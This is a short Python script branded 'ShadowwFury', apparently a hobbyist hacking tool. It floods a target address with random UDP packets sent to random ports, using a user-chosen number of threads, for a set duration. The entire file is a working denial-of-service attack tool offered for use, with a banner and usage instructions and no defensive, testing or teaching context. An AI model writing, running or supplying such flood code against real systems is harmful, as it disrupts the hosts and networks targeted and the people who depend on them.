import socket
import time
import random
import threading
import sys
from colorama import Fore

def banner():
    _ver_ = '1.0.0'   
    print(Fore.RED + '    =/\\                 /\\= ')
    print(Fore.RED + '    / \\ ._   (\\_/)   _./ \\ ') 
    print(Fore.RED + '   / .\'\'._\'--(o.o)--\'_.\'\' \\ ')
    print(Fore.RED + '  /.\' _/ |`\'=/ " \\=\'`| \\_ `.\'')
    print(Fore.RED + ' /` .\' `\\;,-\'\\___/\'-;/` \'. \\')
    print(Fore.RED + '/.-\'       `\\(-V-)/`       `-.\'')
    print(Fore.RED + '`            "   "            `  ')   
    print(Fore.RED + f'\x1b[31m\n ShadowwFury by nateyy, version {_ver_}')

banner()

try:
    Target, Threads, Timer = str(sys.argv[1]), int(sys.argv[2]), float(sys.argv[3])

except IndexError:
    print(Fore.GREEN + '\n[+] Usage: python3 ' + sys.argv[0] + '<Target> <Threads> <Timer>')
try: 
    Timeout = time.time() + 1 * Timer
except Exception:
    exit()

def Attack():
    try:
        Bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < Timeout:
            dport = random.randint(22,65535)
            sock.sendto(Bytes*random.randint(5,22),(Target,dport))
        return
    except Exception as Error:
        print(Fore.RED + f'[-] {Error}')

print(Fore.GREEN + '\n[+] Target Attack...')

for _ in range(0, Threads):
    threading.Thread(target=Attack).start()